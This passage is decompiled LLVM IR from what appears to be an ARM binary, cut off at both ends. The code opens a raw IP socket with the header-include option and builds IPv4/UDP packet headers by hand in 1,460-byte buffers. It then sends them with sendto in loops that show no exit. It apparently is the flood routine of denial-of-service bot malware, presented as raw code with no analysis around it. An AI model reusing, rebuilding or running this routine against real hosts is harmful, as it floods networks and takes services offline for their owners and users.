  %v4_9da8 = inttoptr i32 %v0_9d9c to i32*
  %v5_9da8 = call i32 @function_92dc(i32 %v0_9da4, i32* %v4_9da8, i32 1, i32 1)
  %v2_9db4 = load i32, i32* @global_var_1a420.104, align 4
  store i32 %v2_9db4, i32* %r3.global-to-local, align 4
  %v1_9db8 = urem i32 %v5_9da8, 256
  store i32 %v1_9db8, i32* %ip.global-to-local, align 4
  %v0_9dbc = load i32, i32* @r5, align 4
  store i32 %v0_9dbc, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9dc4 = load i32, i32* @r4, align 4
  store i32 %v0_9dc4, i32* %r0.global-to-local, align 4
  %v5_9dcc = inttoptr i32 %v0_9dbc to i32*
  %v6_9dcc = call i32 @function_92dc(i32 %v0_9dc4, i32* %v5_9dcc, i32 25, i32 %v2_9db4)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_9de0 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_9de0, i32* %r0.global-to-local, align 4
  %v2_9de4 = icmp eq i32 %v3_9de0, -1
  store i1 %v2_9de4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9de4, label %dec_label_pc_a20c, label %dec_label_pc_9df0

dec_label_pc_9df0:                                ; preds = %dec_label_pc_9ca4
  store i32 1, i32* %stack_var_-40, align 4
  %v6_9df8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_9df8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v7_9e0c = call i32 @setsockopt(i32 %v3_9de0, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v7_9e0c, i32* %r0.global-to-local, align 4
  %v2_9e10 = icmp eq i32 %v7_9e0c, -1
  store i1 %v2_9e10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9e10, label %dec_label_pc_a204, label %dec_label_pc_9e18

dec_label_pc_9e18:                                ; preds = %dec_label_pc_9df0
  %v0_9e18 = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_9e24 = urem i32 %v0_9e18, 65536
  store i32 %v3_9e24, i32* %r2.global-to-local, align 4
  %v3_9e28 = icmp ugt i32 %v3_9e24, 1459
  %v9_9e28 = icmp eq i32 %v3_9e24, 1460
  store i1 %v9_9e28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9e28, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_9e18
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_9e18, %bb
  %v0_9e30 = phi i32 [ %v3_9e24, %dec_label_pc_9e18 ], [ 1460, %bb ]
  %v0_9e34 = load i32, i32* @r7, align 4
  %v3_9e34 = mul i32 %v0_9e34, 65536
  store i32 %v3_9e34, i32* %r7.global-to-local, align 4
  %v3_9e38 = urem i32 %v0_9e34, 65536
  store i32 %v3_9e38, i32* %r3.global-to-local, align 4
  %v0_9e3c = load i32, i32* @sl, align 4
  %v2_9e3c = icmp eq i32 %v0_9e3c, 0
  store i1 %v2_9e3c, i1* %cpsr_z.global-to-local, align 1
  %v0_9e40 = load i32, i32* %fp.global-to-local, align 4
  %v3_9e40 = mul i32 %v0_9e40, 65536
  store i32 %v3_9e40, i32* %r0.global-to-local, align 4
  %v0_9e44 = load i32, i32* %sb.global-to-local, align 4
  %v3_9e44 = mul i32 %v0_9e44, 65536
  store i32 %v3_9e44, i32* %r5.global-to-local, align 4
  %tmp72 = icmp slt i32 %v0_9e3c, 1
  br i1 %tmp72, label %bb73, label %bb74

bb73:                                             ; preds = %bb71
  store i32 %v0_9e30, i32* %r3.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %bb71, %bb73
  %v5_9e6c = phi i32 [ %v3_9e38, %bb71 ], [ %v0_9e30, %bb73 ]
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_9e54 = urem i32 %v0_9e40, 65536
  store i32 %v3_9e54, i32* %r2.global-to-local, align 4
  %v3_9e58 = urem i32 %v0_9e44, 65536
  store i32 %v3_9e58, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %tmp72, label %.thread, label %dec_label_pc_9e74

.thread:                                          ; preds = %bb74
  %v6_9e68 = add nsw i32 %v5_9e6c, 28
  store i32 %v6_9e68, i32* @fp, align 4
  %v6_9e6c = add nsw i32 %v5_9e6c, 8
  store i32 %v6_9e6c, i32* @sb, align 4
  br label %dec_label_pc_9fe8

dec_label_pc_9e74:                                ; preds = %bb74
  %v1_9e78 = add nuw nsw i32 %v0_9e30, 28
  store i32 %v1_9e78, i32* @fp, align 4
  %tmp75 = mul nuw nsw i32 %v1_9e78, 256
  %v1_9e84 = and i32 %tmp75, 65280
  %tmp76 = udiv i32 %v0_9e40, 256
  %v3_9e88 = urem i32 %tmp76, 256
  %v2_9e9c = icmp eq i32 %v1_9d44, 0
  store i1 %v2_9e9c, i1* %cpsr_z.global-to-local, align 1
  %v1_9ea0 = urem i32 %v0_9e40, 256
  %v1_9ea8 = add nuw nsw i32 %v0_9e30, 8
  store i32 %v1_9ea8, i32* @sb, align 4
  %v3_9eac = mul i32 %v1_9ea8, 65536
  store i32 %v3_9eac, i32* %r6.global-to-local, align 4
  %v1_9eb0 = urem i32 %v0_9e34, 256
  %v1_9eb4 = urem i32 %v0_9e44, 256
  store i32 %v1_9eb4, i32* %ip.global-to-local, align 4
  store i32 %v1_9e84, i32* %r3.global-to-local, align 4
  %tmp77 = mul nuw nsw i32 %v1_9ea8, 256
  %v4_9ec0 = mul nuw nsw i32 %v1_9ea0, 256
  %v5_9ec0 = or i32 %v4_9ec0, %v3_9e88
  store i32 %v5_9ec0, i32* %r0.global-to-local, align 4
  %v3_9ec4 = mul nuw nsw i32 %v1_9eb0, 256
  store i32 %v3_9ec4, i32* %r2.global-to-local, align 4
  %tmp78 = udiv i32 %v0_9e44, 256
  %v3_9ec8 = urem i32 %tmp78, 256
  %v1_9ecc = and i32 %tmp77, 65280
  store i32 %v1_9ecc, i32* %r1.global-to-local, align 4
  %tmp79 = udiv i32 %v1_9e78, 256
  %tmp80 = udiv i32 %v0_9e34, 256
  %v4_9ed4 = urem i32 %tmp80, 256
  %v5_9ed4 = or i32 %v4_9ed4, %v3_9ec4
  store i32 %v5_9ed4, i32* %r4.global-to-local, align 4
  %v5_9ed8 = trunc i32 %tmp79 to i8
  %v5_9edc = trunc i32 %tmp76 to i8
  %v4_9ee0 = mul nuw nsw i32 %v1_9eb4, 256
  %v5_9ee0 = or i32 %v4_9ee0, %v3_9ec8
  store i32 %v5_9ee0, i32* %r5.global-to-local, align 4
  %tmp81 = udiv i32 %v1_9ea8, 256
  %v4_9ee4 = urem i32 %tmp81, 256
  %v5_9ee4 = or i32 %v4_9ee4, %v1_9ecc
  store i32 %v5_9ee4, i32* %r7.global-to-local, align 4
  br i1 %v2_9e9c, label %dec_label_pc_9eec, label %dec_label_pc_a214

dec_label_pc_9eec:                                ; preds = %dec_label_pc_9e74
  %v3_9eec36 = udiv i32 %v1_9e84, 256
  store i32 %v3_9eec36, i32* %ip.global-to-local, align 4
  store i32 %v1_9ea0, i32* %r0.global-to-local, align 4
  store i32 %v1_9eb0, i32* %r1.global-to-local, align 4
  store i32 %v1_9eb4, i32* %r2.global-to-local, align 4
  %v3_9efc37 = udiv i32 %v1_9ecc, 256
  store i32 %v3_9efc37, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v4_9f60 = sext i8 %v5_9cfc to i32
  %v4_9fa0 = sext i8 %v5_9edc to i32
  %sext15 = mul i32 %v0_9e40, 16777216
  %v4_9fa4 = sdiv i32 %sext15, 16777216
  %sext16 = mul i32 %v0_9e34, 16777216
  %v4_9fbc = sdiv i32 %sext16, 16777216
  %sext17 = mul i32 %v1_9ea8, 16777216
  %v4_9fc0 = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %v0_9e44, 16777216
  %v4_9fc4 = sdiv i32 %sext18, 16777216
  %v1_9fac = trunc i32 %v1_9e78 to i8
  %v1_9fcc = trunc i32 %v4_9fc0 to i8
  br label %dec_label_pc_9f18

dec_label_pc_9f18:                                ; preds = %dec_label_pc_9f18, %dec_label_pc_9eec
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_9f24 = call i32* @calloc(i32 1510, i32 1)
  %v4_9f24 = ptrtoint i32* %v2_9f24 to i32
  store i32 %v4_9f24, i32* %r0.global-to-local, align 4
  store i32 %v4_9cc4, i32* %ip.global-to-local, align 4
  %v3_9f2c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9f2c, i32* %r2.global-to-local, align 4
  %v2_9f30 = load i32, i32* %r6.global-to-local, align 4
  %v5_9f30 = mul i32 %v2_9f30, 4
  %v6_9f30 = add i32 %v5_9f30, %v4_9cc4
  %v7_9f30 = inttoptr i32 %v6_9f30 to i32*
  store i32 %v4_9f24, i32* %v7_9f30, align 4
  %v0_9f34 = load i32, i32* %ip.global-to-local, align 4
  %v1_9f34 = load i32, i32* %r2.global-to-local, align 4
  %v4_9f34 = mul i32 %v1_9f34, 4
  %v5_9f34 = add i32 %v4_9f34, %v0_9f34
  %v6_9f34 = inttoptr i32 %v5_9f34 to i32*
  %v7_9f34 = load i32, i32* %v6_9f34, align 4
  store i32 %v7_9f34, i32* %r1.global-to-local, align 4
  %v1_9f38 = inttoptr i32 %v7_9f34 to i8*
  %v2_9f38 = load i8, i8* %v1_9f38, align 1
  %tmp = urem i8 %v2_9f38, 16
  %v1_9f3c = zext i8 %tmp to i32
  %v1_9f40 = or i32 %v1_9f3c, 64
  store i32 %v1_9f40, i32* %r3.global-to-local, align 4
  %v1_9f44 = trunc i32 %v1_9f40 to i8
  store i8 %v1_9f44, i8* %v1_9f38, align 1
  %v0_9f48 = load i32, i32* %r1.global-to-local, align 4
  %v1_9f48 = inttoptr i32 %v0_9f48 to i8*
  %v2_9f48 = load i8, i8* %v1_9f48, align 1
  %v3_9f48 = zext i8 %v2_9f48 to i32
  %v1_9f4c = and i32 %v3_9f48, 240
  %v1_9f50 = or i32 %v1_9f4c, 5
  store i32 %v1_9f50, i32* %r2.global-to-local, align 4
  %v3_9f58 = add i32 %v0_9f48, 9
  %v4_9f58 = inttoptr i32 %v3_9f58 to i8*
  store i8 17, i8* %v4_9f58, align 1
  %v0_9f5c = load i32, i32* %r2.global-to-local, align 4
  %v1_9f5c = trunc i32 %v0_9f5c to i8
  %v2_9f5c = load i32, i32* %r1.global-to-local, align 4
  %v3_9f5c = inttoptr i32 %v2_9f5c to i8*
  store i8 %v1_9f5c, i8* %v3_9f5c, align 1
  store i32 %v4_9f60, i32* %r0.global-to-local, align 4
  %v2_9f64 = load i32, i32* %r1.global-to-local, align 4
  %v3_9f64 = add i32 %v2_9f64, 1
  %v4_9f64 = inttoptr i32 %v3_9f64 to i8*
  store i8 %v5_9cfc, i8* %v4_9f64, align 1
  %v2_9f6c = load i32, i32* %r1.global-to-local, align 4
  %v3_9f6c = add i32 %v2_9f6c, 8
  %v4_9f6c = inttoptr i32 %v3_9f6c to i8*
  store i8 %v5_9d34, i8* %v4_9f6c, align 1
  %v3_9f70 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9f70, i32* %r2.global-to-local, align 4
  store i32 %v6_9dcc, i32* %ip.global-to-local, align 4
  %v3_9f78 = mul i32 %v3_9f70, 32
  store i32 %v3_9f78, i32* %r3.global-to-local, align 4
  %v1_9f7c = load i32, i32* %r1.global-to-local, align 4
  %v2_9f7c = add i32 %v1_9f7c, 12
  %v3_9f7c = inttoptr i32 %v2_9f7c to i32*
  store i32 %v6_9dcc, i32* %v3_9f7c, align 4
  %v0_9f80 = load i32, i32* %r3.global-to-local, align 4
  %v1_9f80 = load i32, i32* %r2.global-to-local, align 4
  %tmp83 = mul i32 %v1_9f80, -8
  %v5_9f80 = add i32 %v0_9f80, %tmp83
  %v1_9f84 = load i32, i32* @r8, align 4
  %v2_9f84 = add i32 %v5_9f80, %v1_9f84
  store i32 %v2_9f84, i32* %r3.global-to-local, align 4
  %v1_9f88 = add i32 %v2_9f84, 16
  %v2_9f88 = inttoptr i32 %v1_9f88 to i32*
  %v3_9f88 = load i32, i32* %v2_9f88, align 4
  %v1_9f8c = load i32, i32* %r1.global-to-local, align 4
  %v2_9f8c = add i32 %v1_9f8c, 16
  %v3_9f8c = inttoptr i32 %v2_9f8c to i32*
  store i32 %v3_9f88, i32* %v3_9f8c, align 4
  %v0_9f94 = load i32, i32* %r2.global-to-local, align 4
  %v1_9f94 = add i32 %v0_9f94, 1
  store i32 %v1_9f94, i32* %r6.global-to-local, align 4
  %v2_9f98 = load i32, i32* %r1.global-to-local, align 4
  %v3_9f98 = add i32 %v2_9f98, 2
  %v4_9f98 = inttoptr i32 %v3_9f98 to i8*
  store i8 %v5_9ed8, i8* %v4_9f98, align 1
  store i32 %v4_9fa0, i32* %ip.global-to-local, align 4
  store i32 %v4_9fa4, i32* %r0.global-to-local, align 4
  %v0_9fa8 = load i32, i32* %r1.global-to-local, align 4
  %v1_9fa8 = add i32 %v0_9fa8, 20
  store i32 %v1_9fa8, i32* %r3.global-to-local, align 4
  %v3_9fac = add i32 %v0_9fa8, 3
  %v4_9fac = inttoptr i32 %v3_9fac to i8*
  store i8 %v1_9fac, i8* %v4_9fac, align 1
  %v0_9fb0 = load i32, i32* %ip.global-to-local, align 4
  %v1_9fb0 = trunc i32 %v0_9fb0 to i8
  %v2_9fb0 = load i32, i32* %r1.global-to-local, align 4
  %v3_9fb0 = add i32 %v2_9fb0, 4
  %v4_9fb0 = inttoptr i32 %v3_9fb0 to i8*
  store i8 %v1_9fb0, i8* %v4_9fb0, align 1
  %v0_9fb4 = load i32, i32* %r0.global-to-local, align 4
  %v1_9fb4 = trunc i32 %v0_9fb4 to i8
  %v2_9fb4 = load i32, i32* %r1.global-to-local, align 4
  %v3_9fb4 = add i32 %v2_9fb4, 5
  %v4_9fb4 = inttoptr i32 %v3_9fb4 to i8*
  store i8 %v1_9fb4, i8* %v4_9fb4, align 1
  %v0_9fb8 = load i32, i32* %r4.global-to-local, align 4
  %v1_9fb8 = trunc i32 %v0_9fb8 to i8
  %v2_9fb8 = load i32, i32* %r1.global-to-local, align 4
  %v3_9fb8 = add i32 %v2_9fb8, 20
  %v4_9fb8 = inttoptr i32 %v3_9fb8 to i8*
  store i8 %v1_9fb8, i8* %v4_9fb8, align 1
  store i32 %v4_9fbc, i32* %r2.global-to-local, align 4
  store i32 %v4_9fc0, i32* %r1.global-to-local, align 4
  store i32 %v4_9fc4, i32* %ip.global-to-local, align 4
  %v0_9fc8 = load i32, i32* %r6.global-to-local, align 4
  %v1_9fc8 = load i32, i32* @sl, align 4
  %v9_9fc8 = icmp eq i32 %v0_9fc8, %v1_9fc8
  store i1 %v9_9fc8, i1* %cpsr_z.global-to-local, align 1
  %v2_9fcc = load i32, i32* %r3.global-to-local, align 4
  %v3_9fcc = add i32 %v2_9fcc, 5
  %v4_9fcc = inttoptr i32 %v3_9fcc to i8*
  store i8 %v1_9fcc, i8* %v4_9fcc, align 1
  %v0_9fd0 = load i32, i32* %r2.global-to-local, align 4
  %v1_9fd0 = trunc i32 %v0_9fd0 to i8
  %v2_9fd0 = load i32, i32* %r3.global-to-local, align 4
  %v3_9fd0 = add i32 %v2_9fd0, 1
  %v4_9fd0 = inttoptr i32 %v3_9fd0 to i8*
  store i8 %v1_9fd0, i8* %v4_9fd0, align 1
  %v0_9fd4 = load i32, i32* %r5.global-to-local, align 4
  %v1_9fd4 = trunc i32 %v0_9fd4 to i8
  %v2_9fd4 = load i32, i32* %r3.global-to-local, align 4
  %v3_9fd4 = add i32 %v2_9fd4, 2
  %v4_9fd4 = inttoptr i32 %v3_9fd4 to i8*
  store i8 %v1_9fd4, i8* %v4_9fd4, align 1
  %v0_9fd8 = load i32, i32* %ip.global-to-local, align 4
  %v1_9fd8 = trunc i32 %v0_9fd8 to i8
  %v2_9fd8 = load i32, i32* %r3.global-to-local, align 4
  %v3_9fd8 = add i32 %v2_9fd8, 3
  %v4_9fd8 = inttoptr i32 %v3_9fd8 to i8*
  store i8 %v1_9fd8, i8* %v4_9fd8, align 1
  %v0_9fdc = load i32, i32* %r7.global-to-local, align 4
  %v1_9fdc = trunc i32 %v0_9fdc to i8
  %v2_9fdc = load i32, i32* %r3.global-to-local, align 4
  %v3_9fdc = add i32 %v2_9fdc, 4
  %v4_9fdc = inttoptr i32 %v3_9fdc to i8*
  store i8 %v1_9fdc, i8* %v4_9fdc, align 1
  %v0_9fe0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_9fe0, i32* %stack_var_-40, align 4
  %v5_9fe4 = icmp slt i32 %v0_9fc8, %v1_9fc8
  br i1 %v5_9fe4, label %dec_label_pc_9f18, label %dec_label_pc_9fe8

dec_label_pc_9fe8:                                ; preds = %dec_label_pc_a248, %dec_label_pc_9f18, %.thread
  %v0_9fe8 = load i32, i32* @sl, align 4
  %v2_9fe8 = icmp eq i32 %v0_9fe8, 0
  store i1 %v2_9fe8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v9_a194 = icmp eq i32 %v3_9e54, add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1)
  %v2_a060 = icmp eq i32 %v1_9db8, 0
  %v2_a028 = icmp eq i32 %v6_9dcc, -1
  br label %dec_label_pc_9ff0.outer

dec_label_pc_9ff0.outer:                          ; preds = %dec_label_pc_a110, %dec_label_pc_9fe8
  %v1_9ff0.ph.in = phi i32 [ %v1_a104, %dec_label_pc_a110 ], [ %v0_9fe8, %dec_label_pc_9fe8 ]
  %v0_9ff0.ph = phi i1 [ %v2_a110, %dec_label_pc_a110 ], [ %v2_9fe8, %dec_label_pc_9fe8 ]
  %v1_9ff0.ph = icmp slt i32 %v1_9ff0.ph.in, 0
  %v4_9ff0 = or i1 %v1_9ff0.ph, %v0_9ff0.ph
  br label %dec_label_pc_9ff0

dec_label_pc_9ff0:                                ; preds = %dec_label_pc_9ff0.outer, %dec_label_pc_9ff0
  br i1 %v4_9ff0, label %dec_label_pc_9ff0, label %dec_label_pc_9ff4

dec_label_pc_9ff4:                                ; preds = %dec_label_pc_9ff0
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_a000

dec_label_pc_a000:                                ; preds = %dec_label_pc_a068, %dec_label_pc_9ff4
  %v1_a014 = phi i32 [ %v1_a100, %dec_label_pc_a068 ], [ 0, %dec_label_pc_9ff4 ]
  %v5_a004 = mul i32 %v1_a014, 24
  %v1_a008 = load i32, i32* @r8, align 4
  %v2_a008 = add i32 %v1_a008, %v5_a004
  store i32 %v2_a008, i32* %r3.global-to-local, align 4
  store i32 %v4_9cc4, i32* %ip.global-to-local, align 4
  %v1_a010 = add i32 %v2_a008, 20
  %v2_a010 = inttoptr i32 %v1_a010 to i8*
  %v3_a010 = load i8, i8* %v2_a010, align 1
  %v4_a010 = zext i8 %v3_a010 to i32
  store i32 %v4_a010, i32* %r2.global-to-local, align 4
  %v4_a014 = mul i32 %v1_a014, 4
  %v5_a014 = add i32 %v4_a014, %v4_9cc4
  %v6_a014 = inttoptr i32 %v5_a014 to i32*
  %v7_a014 = load i32, i32* %v6_a014, align 4
  store i32 %v7_a014, i32* @r5, align 4
  %v7_a018 = icmp eq i8 %v3_a010, 31
  store i1 %v7_a018, i1* %cpsr_z.global-to-local, align 1
  %v1_a01c = add i32 %v7_a014, 20
  store i32 %v1_a01c, i32* @r6, align 4
  %tmp84 = icmp ult i8 %v3_a010, 32
  br i1 %tmp84, label %dec_label_pc_a11c, label %dec_label_pc_a024

dec_label_pc_a024:                                ; preds = %dec_label_pc_a000
  store i32 %v6_9dcc, i32* %r0.global-to-local, align 4
  store i1 %v2_a028, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a028, label %dec_label_pc_a184, label %dec_label_pc_a030

dec_label_pc_a030:                                ; preds = %dec_label_pc_a11c, %dec_label_pc_a024
  store i32 %v3_9e54, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_a194, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a194, label %dec_label_pc_a1a0, label %dec_label_pc_a044

dec_label_pc_a044:                                ; preds = %dec_label_pc_a184.dec_label_pc_a044_crit_edge, %dec_label_pc_a030
  %v1_a048 = phi i32 [ %v1_a048.pre, %dec_label_pc_a184.dec_label_pc_a044_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.102 to i32), i32 -1), %dec_label_pc_a030 ]
  store i32 %v3_9e38, i32* %r2.global-to-local, align 4
  %v9_a048 = icmp eq i32 %v3_9e38, %v1_a048
  store i1 %v9_a048, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a048, label %dec_label_pc_a1bc, label %dec_label_pc_a050

dec_label_pc_a050:                                ; preds = %dec_label_pc_a1a0.dec_label_pc_a050_crit_edge, %dec_label_pc_a044
  %v1_a054 = phi i32 [ %v1_a054.pre, %dec_label_pc_a1a0.dec_label_pc_a050_crit_edge ], [ %v1_a048, %dec_label_pc_a044 ]
  store i32 %v3_9e58, i32* %r3.global-to-local, align 4
  %v9_a054 = icmp eq i32 %v3_9e58, %v1_a054
  store i1 %v9_a054, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a054, label %dec_label_pc_a1d8, label %dec_label_pc_a05c

dec_label_pc_a05c:                                ; preds = %dec_label_pc_a1bc, %dec_label_pc_a050
  store i32 %v1_9db8, i32* %ip.global-to-local, align 4
  store i1 %v2_a060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a060, label %dec_label_pc_a068, label %dec_label_pc_a1f4

dec_label_pc_a068:                                ; preds = %dec_label_pc_a05c, %dec_label_pc_a1d8, %dec_label_pc_a1f4
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_a06c = load i32, i32* @r7, align 4
  %v1_a06c = trunc i32 %v0_a06c to i8
  %v2_a06c = load i32, i32* @r5, align 4
  %v3_a06c = add i32 %v2_a06c, 10
  %v4_a06c = inttoptr i32 %v3_a06c to i8*
  store i8 %v1_a06c, i8* %v4_a06c, align 1
  %v0_a070 = load i32, i32* @r7, align 4
  %v1_a070 = trunc i32 %v0_a070 to i8
  %v2_a070 = load i32, i32* @r5, align 4
  %v3_a070 = add i32 %v2_a070, 11
  %v4_a070 = inttoptr i32 %v3_a070 to i8*
  store i8 %v1_a070, i8* %v4_a070, align 1
  %v0_a074 = load i32, i32* @r5, align 4
  store i32 %v0_a074, i32* @r0, align 4
  %v2_a078 = call i32 @function_ddf4(i32 %v0_a074, i32 20)
  %v3_a078 = trunc i32 %v2_a078 to i8
  store i32 %v2_a078, i32* %r0.global-to-local, align 4
  %v4_a07c = sdiv i32 %v2_a078, 256
  store i32 %v4_a07c, i32* %r3.global-to-local, align 4
  %v1_a080 = trunc i32 %v4_a07c to i8
  %v2_a080 = load i32, i32* @r5, align 4
  %v3_a080 = add i32 %v2_a080, 11
  %v4_a080 = inttoptr i32 %v3_a080 to i8*
  store i8 %v1_a080, i8* %v4_a080, align 1
  %v3_a084 = load i32, i32* @r5, align 4
  %v4_a084 = add i32 %v3_a084, 10
  %v5_a084 = inttoptr i32 %v4_a084 to i8*
  store i8 %v3_a078, i8* %v5_a084, align 1
  %v0_a088 = load i32, i32* @r7, align 4
  %v1_a088 = trunc i32 %v0_a088 to i8
  %v2_a088 = load i32, i32* @r6, align 4
  %v3_a088 = add i32 %v2_a088, 6
  %v4_a088 = inttoptr i32 %v3_a088 to i8*
  store i8 %v1_a088, i8* %v4_a088, align 1
  %v0_a08c = load i32, i32* @r7, align 4
  %v1_a08c = trunc i32 %v0_a08c to i8
  %v2_a08c = load i32, i32* @r6, align 4
  %v3_a08c = add i32 %v2_a08c, 7
  %v4_a08c = inttoptr i32 %v3_a08c to i8*
  store i8 %v1_a08c, i8* %v4_a08c, align 1
  %v0_a090 = load i32, i32* @r5, align 4
  %v1_a090 = add i32 %v0_a090, 24
  %v2_a090 = inttoptr i32 %v1_a090 to i8*
  %v3_a090 = load i8, i8* %v2_a090, align 1
  %v4_a090 = zext i8 %v3_a090 to i32
  store i32 %v4_a090, i32* %r3.global-to-local, align 4
  %v1_a094 = add i32 %v0_a090, 25
  %v2_a094 = inttoptr i32 %v1_a094 to i8*
  %v3_a094 = load i8, i8* %v2_a094, align 1
  %v4_a094 = zext i8 %v3_a094 to i32
  %v0_a098 = load i32, i32* @r6, align 4
  store i32 %v0_a098, i32* @r1, align 4
  %v4_a09c = mul nuw nsw i32 %v4_a094, 256
  %v5_a09c = or i32 %v4_a09c, %v4_a090
  store i32 %v5_a09c, i32* %r2.global-to-local, align 4
  store i32 %v0_a090, i32* %r0.global-to-local, align 4
  %v0_a0a4 = load i32, i32* @sb, align 4
  store i32 %v0_a0a4, i32* %r3.global-to-local, align 4
  %v4_a0a8 = call i32 @function_de50(i32 %v0_a090, i32 %v0_a098, i32 %v5_a09c, i32 %v0_a0a4)
  %v5_a0a8 = trunc i32 %v4_a0a8 to i8
  store i32 %v4_a0a8, i32* %r0.global-to-local, align 4
  %v4_a0ac38 = udiv i32 %v4_a0a8, 256
  %v1_a0b0 = trunc i32 %v4_a0ac38 to i8
  %v2_a0b0 = load i32, i32* @r6, align 4
  %v3_a0b0 = add i32 %v2_a0b0, 7
  %v4_a0b0 = inttoptr i32 %v3_a0b0 to i8*
  store i8 %v1_a0b0, i8* %v4_a0b0, align 1
  %v3_a0b4 = load i32, i32* @r6, align 4
  %v4_a0b4 = add i32 %v3_a0b4, 6
  %v5_a0b4 = inttoptr i32 %v4_a0b4 to i8*
  store i8 %v5_a0a8, i8* %v5_a0b4, align 1
  %v3_a0b8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a0b8, i32* %r3.global-to-local, align 4
  %v0_a0bc = load i32, i32* @r5, align 4
  %v1_a0bc = add i32 %v0_a0bc, 20
  %v2_a0bc = inttoptr i32 %v1_a0bc to i32*
  %v3_a0bc = load i32, i32* %v2_a0bc, align 4
  %v3_a0c4 = udiv i32 %v3_a0bc, 65536
  store i32 %v3_a0c4, i32* %r2.global-to-local, align 4
  %v5_a0c8 = mul i32 %v3_a0b8, 24
  %v1_a0cc = load i32, i32* @r8, align 4
  %v2_a0cc = add i32 %v1_a0cc, %v5_a0c8
  store i32 %v2_a0cc, i32* %ip.global-to-local, align 4
  %v3_a0d035 = udiv i32 %v3_a0bc, 16777216
  %v1_a0d4 = trunc i32 %v3_a0d035 to i8
  %v3_a0d4 = add i32 %v2_a0cc, 3
  %v4_a0d4 = inttoptr i32 %v3_a0d4 to i8*
  store i8 %v1_a0d4, i8* %v4_a0d4, align 1
  %v0_a0d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a0d8 = trunc i32 %v0_a0d8 to i8
  %v2_a0d8 = load i32, i32* %ip.global-to-local, align 4
  %v3_a0d8 = add i32 %v2_a0d8, 2
  %v4_a0d8 = inttoptr i32 %v3_a0d8 to i8*
  store i8 %v1_a0d8, i8* %v4_a0d8, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a0e0 = load i32, i32* @r5, align 4
  store i32 %v0_a0e0, i32* %r1.global-to-local, align 4
  store i32 %v3_9de0, i32* %r0.global-to-local, align 4
  %v0_a0e8 = load i32, i32* @fp, align 4
  store i32 %v0_a0e8, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_a0f0 = load i32, i32* %ip.global-to-local, align 4
  %v4_a0f0 = inttoptr i32 %v0_a0f0 to %sockaddr*
  %v7_a0f8 = inttoptr i32 %v0_a0e0 to i32*
  %v9_a0f8 = call i32 @sendto(i32 %v3_9de0, i32* %v7_a0f8, i32 %v0_a0e8, i32 16384, %sockaddr* %v4_a0f0, i32 16)
  %v3_a0fc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a0fc, i32* %r3.global-to-local, align 4
  %v1_a100 = add i32 %v3_a0fc, 1
  store i32 %v1_a100, i32* %r0.global-to-local, align 4
  %v1_a104 = load i32, i32* @sl, align 4
  %v9_a104 = icmp eq i32 %v1_a100, %v1_a104
  store i1 %v9_a104, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a100, i32* %stack_var_-40, align 4
  %v5_a10c = icmp slt i32 %v1_a100, %v1_a104
  br i1 %v5_a10c, label %dec_label_pc_a000, label %dec_label_pc_a110

dec_label_pc_a110:                                ; preds = %dec_label_pc_a068
  %v2_a110 = icmp eq i32 %v1_a104, 0
  store i1 %v2_a110, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9ff0.outer

dec_label_pc_a11c:                                ; preds = %dec_label_pc_a000
  %v1_a11c = add i32 %v2_a008, 16
  %v2_a11c = inttoptr i32 %v1_a11c to i32*
  %v3_a11c = load i32, i32* %v2_a11c, align 4
  store i32 %v3_a11c, i32* %r4.global-to-local, align 4
  %v0_a120 = call i32 @function_f67c()
  store i32 %v0_a120, i32* %r0.global-to-local, align 4
  %v3_a124 = load i32, i32* %stack_var_-40, align 4
  %v5_a12c = mul i32 %v3_a124, 24
  %v1_a134 = load i32, i32* @r8, align 4
  %v2_a134 = add i32 %v1_a134, %v5_a12c
